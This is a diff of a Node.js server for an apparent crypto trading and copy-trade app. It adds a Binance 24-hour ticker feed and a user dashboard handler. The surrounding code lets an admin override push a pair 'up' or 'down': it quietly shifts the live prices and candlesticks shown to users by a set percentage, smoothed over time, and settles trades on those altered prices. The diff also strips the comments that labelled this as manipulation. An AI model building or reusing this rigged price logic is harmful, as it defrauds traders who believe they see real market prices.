@@ -1,10 +1,33 @@
 const jwt = require("jsonwebtoken");
 const mongoose = require("mongoose");
 const WebSocket = require('ws'); 
+const https = require('https'); // 🚀 NEW: HTTPS for Binance Ticker API
 const AdminCopyTrade = require('./models/AdminCopyTrade');
 
 // Global reference for marketData
 let globalMarketData = {};
+
+// 🚀 NEW: Fetch 24-Hour Ticker Data (Percentage Change)
+let last24hTickerData = {};
+
+function fetch24hTickerData() {
+    https.get('https://api.binance.com/api/v3/ticker/24hr', (res) => {
+        let data = '';
+        res.on('data', chunk => data += chunk);
+        res.on('end', () => {
+            try {
+                const parsed = JSON.parse(data);
+                parsed.forEach(ticker => {
+                    last24hTickerData[ticker.symbol] = parseFloat(ticker.priceChangePercent);
+                });
+            } catch (e) {}
+        });
+    }).on('error', (e) => {});
+}
+
+// Har 10 second baad percentage update hoti rahegi
+setInterval(fetch24hTickerData, 10000);
+fetch24hTickerData(); 
 
 // --- Copy Trade Execution Logic ---
 async function executeCopyTrade(io, User, Trade, copyTradeId) {
@@ -98,13 +121,12 @@ async function getTradeDirectionBasedOnVolume(asset, userRequestedDirection) {
     }
 }
 
-// --- NEW: WEBSOCKET TRADE MONITORING LOGIC ---
+// --- WEBSOCKET TRADE MONITORING LOGIC ---
 function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
     const lastProcessedCompletedCandleTs = {};
     const lastProcessedActivationTs = {};
     let lastCopyTradeCleanup = Date.now();
 
-    // Variables for Smooth Gradual Movement
     const currentOffsets = {}; 
     const lastAggTimes = {};
 
@@ -121,7 +143,7 @@ function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
     let ws = new WebSocket(wsUrl);
 
     ws.on('open', () => {
-        console.log('✅ Connected to Binance WebSockets for Live Market Data & Ultra-Fast Ticks');
+        console.log('✅ Connected to Binance WebSockets for Live Market Data');
     });
 
     ws.on('message', async (message) => {
@@ -136,18 +158,15 @@ function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
                 overrides = indexModule.candleOverride || {};
             } catch (e) {}
 
-            const MANIPULATION_PERCENTAGE = 0.0005; // 0.05% manipulation
-            const SMOOTHING_TIME_MS = 15000; // Takes 15 seconds to fully apply offset
+            const MANIPULATION_PERCENTAGE = 0.0005; 
+            const SMOOTHING_TIME_MS = 15000; 
 
-            // ==========================================
-            // 1. ULTRA-FAST TICK-BY-TICK PRICE (aggTrade)
-            // ==========================================
+            // 1. ULTRA-FAST TICK-BY-TICK PRICE
             if (parsed.e === 'aggTrade') {
                 const pair = parsed.s;
                 let realPrice = parseFloat(parsed.p);
                 const binanceTime = parsed.E; 
 
-                // Target logic
                 let targetOffset = 0;
                 if (overrides[pair] === 'up') targetOffset = realPrice * MANIPULATION_PERCENTAGE;
                 else if (overrides[pair] === 'down') targetOffset = -(realPrice * MANIPULATION_PERCENTAGE);
@@ -157,7 +176,6 @@ function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
                 const timeDiff = binanceTime - (lastAggTimes[pair] || binanceTime);
                 lastAggTimes[pair] = binanceTime;
 
-                // Smooth gradual manipulation logic
                 const speedPerMs = (realPrice * MANIPULATION_PERCENTAGE) / SMOOTHING_TIME_MS;
 
                 if (currentOffsets[pair] < targetOffset) {
@@ -176,14 +194,23 @@ function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
 
                 const now = Date.now();
                 if (now - (globalMarketData[pair].lastEmit || 0) > 250) {
+                    // Update Trade App
                     io.emit('price_update', { pair, price: currentPrice, timestamp: binanceTime });
+                    
+                    // 🚀 NEW: Update Dashboard App Live Prices
+                    const formattedPair = pair.replace('USDT', '/USDT');
+                    io.emit('dashboard_price_update', {
+                        [formattedPair]: {
+                            price: currentPrice,
+                            change: last24hTickerData[pair] || 0
+                        }
+                    });
+
                     globalMarketData[pair].lastEmit = now;
                 }
             }
 
-            // ==========================================
-            // 2. CANDLESTICK DATA & SETTLEMENT (kline)
-            // ==========================================
+            // 2. CANDLESTICK DATA & SETTLEMENT
             else if (parsed.e === 'kline') {
                 const pair = parsed.s; 
                 const k = parsed.k;
@@ -195,7 +222,6 @@ function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
                 let highPrice = parseFloat(k.h) + activeOffset;
                 let lowPrice = parseFloat(k.l) + activeOffset;
 
-                // Gap removal logic - Attach new candle to previous close
                 if (globalMarketData[pair] && globalMarketData[pair].candles && globalMarketData[pair].candles.length > 0) {
                     const prevCandle = globalMarketData[pair].candles[globalMarketData[pair].candles.length - 1];
                     openPrice = prevCandle.close; 
@@ -203,7 +229,6 @@ function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
                     openPrice += activeOffset;
                 }
 
-                // Wicks adjustment to avoid visual breaks
                 highPrice = Math.max(highPrice, openPrice, closePrice);
                 lowPrice = Math.min(lowPrice, openPrice, closePrice);
 
@@ -240,7 +265,6 @@ function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
                         lastProcessedCompletedCandleTs[pair] = lastCompletedTs;
                     }
 
-                    // 🚀 AUTO-RESET LOGIC
                     try {
                         if (indexModule.candleOverride && indexModule.candleOverride[pair]) {
                             indexModule.candleOverride[pair] = null;
@@ -284,14 +308,10 @@ async function initialize(io, User, Trade, marketData, TRADE_PAIRS) {
                 }
             }
             
-            if (!token) {
-                return next(new Error("Authentication error: No token"));
-            }
+            if (!token) return next(new Error("Authentication error: No token"));
             
             jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
-                if (err) {
-                    return next(new Error("Authentication error: Invalid token"));
-                }
+                if (err) return next(new Error("Authentication error: Invalid token"));
                 socket.decoded = decoded;
                 next();
             });
@@ -300,7 +320,6 @@ async function initialize(io, User, Trade, marketData, TRADE_PAIRS) {
         }
     });
 
-    // START THE NEW WEBSOCKET MONITORING ENGINE
     runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS);
 
     io.on("connection", async (socket) => {
@@ -318,7 +337,62 @@ async function initialize(io, User, Trade, marketData, TRADE_PAIRS) {
                 marketData: globalMarketData
             });
 
-            // --- Instant Trade ---
+            // 🚀 NEW: DASHBOARD DATA HANDLER
+            socket.on('request_dashboard_data', async () => {
+                try {
+                    const freshUser = await User.findById(userId);
+                    if (!freshUser) return;
+
+                    const today = new Date();
+                    today.setHours(0, 0, 0, 0);
+                    const tomorrow = new Date(today);
+                    tomorrow.setDate(tomorrow.getDate() + 1);
+
+                    const todayTrades = await Trade.find({ 
+                        userId: freshUser._id, 
+                        status: "closed", 
+                        closeTime: { $gte: today, $lt: tomorrow } 
+                    });
+
+                    const todayPnl = todayTrades.reduce((sum, t) => sum + (t.pnl || 0), 0);
+
+                    const assetsInfo = [
+                        { ticker: 'BTC/USDT', name: 'Bitcoin' },
+                        { ticker: 'ETH/USDT', name: 'Ethereum' },
+                        { ticker: 'BNB/USDT', name: 'Binance Coin' },
+                        { ticker: 'SOL/USDT', name: 'Solana' },
+                        { ticker: 'XRP/USDT', name: 'Ripple' },
+                        { ticker: 'ADA/USDT', name: 'Cardano' },
+                        { ticker: 'DOGE/USDT', name: 'Dogecoin' },
+                        { ticker: 'AVAX/USDT', name: 'Avalanche' },
+                        { ticker: 'LINK/USDT', name: 'Chainlink' },
+                        { ticker: 'MATIC/USDT', name: 'Polygon' }
+                    ];
+
+                    const assets = assetsInfo.map(info => {
+                        const rawPair = info.ticker.replace('/', '');
+                        return {
+                            ticker: info.ticker,
+                            name: info.name,
+                            price: globalMarketData[rawPair]?.currentPrice || 0,
+                            change: last24hTickerData[rawPair] || 0 // Accurate 24h%
+                        };
+                    });
+
+                    socket.emit('dashboard_data', {
+                        success: true,
+                        data: {
+                            username: freshUser.username,
+                            balance: freshUser.balance,
+                            todayPnl: todayPnl,
+                            assets: assets
+                        }
+                    });
+                } catch (error) {
+                    console.error("Dashboard Data Error:", error);
+                }
+            });
+
             socket.on("trade", async (data) => {
                 try {
                     const { asset, direction, amount } = data;
@@ -370,7 +444,6 @@ async function initialize(io, User, Trade, marketData, TRADE_PAIRS) {
                 }
             });
 
-            // --- Copy Trade ---
             socket.on("copy_trade", async (data) => {
                 const session = await mongoose.startSession();
                 session.startTransaction();
@@ -405,10 +478,7 @@ async function initialize(io, User, Trade, marketData, TRADE_PAIRS) {
                         return socket.emit("error", { message: "This copy trade is no longer available" });
                     }
 
-                    const alreadyCopied = copyTrade.userCopies.find(
-                        copy => copy.userId.toString() === userId
-                    );
-
+                    const alreadyCopied = copyTrade.userCopies.find(copy => copy.userId.toString() === userId);
                     if (alreadyCopied) {
                         await session.abortTransaction();
                         session.endSession();
